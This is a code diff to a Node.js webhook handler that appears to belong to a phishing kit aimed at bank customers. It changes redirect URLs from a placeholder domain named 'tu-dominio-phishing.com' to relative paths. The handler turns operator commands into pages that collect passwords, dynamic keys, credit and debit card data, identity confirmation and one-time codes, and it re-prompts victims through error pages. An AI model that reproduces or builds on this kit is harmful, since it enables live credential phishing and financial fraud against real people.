@@ -97,29 +97,29 @@ app.post('/webhook', async (req, res) => {
       let redirectUrl = '';
 
       if (data.startsWith('error_logo:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/index1.html';
+        redirectUrl = 'index1.html';
       } else if (data.startsWith('error_clave:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/index2.html';
+        redirectUrl = 'index2.html';
       } else if (data.startsWith('pedir_dinamica:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/index3.html';
+        redirectUrl = 'index3.html';
       } else if (data.startsWith('error_dinamica:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/error_dinamica.html';
+        redirectUrl = 'error_dinamica.html';
       } else if (data.startsWith('pedir_tc:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html';
+        redirectUrl = 'desembolso.html';
       } else if (data.startsWith('error_tc:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/desembolso.html?error=true';
+        redirectUrl = 'desembolso.html?error=true';
       } else if (data.startsWith('pedir_td:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html';
+        redirectUrl = 'tarjeta_debito.html';
       } else if (data.startsWith('error_td:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/tarjeta_debito.html?error=true';
+        redirectUrl = 'tarjeta_debito.html?error=true';
       } else if (data.startsWith('soy:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/soyyo.html';
+        redirectUrl = 'soyyo.html';
       } else if (data.startsWith('otp:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/otp.html';
+        redirectUrl = 'otp.html';
       } else if (data.startsWith('error_otp:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/otp.html?error=true';
+        redirectUrl = 'otp.html?error=true';
       } else if (data.startsWith('finalizar:')) {
-        redirectUrl = 'https://tu-dominio-phishing.com/final1.html';
+        redirectUrl = 'final1.html';
       }
 
       // 4. Enviar mensaje con el link de continuación
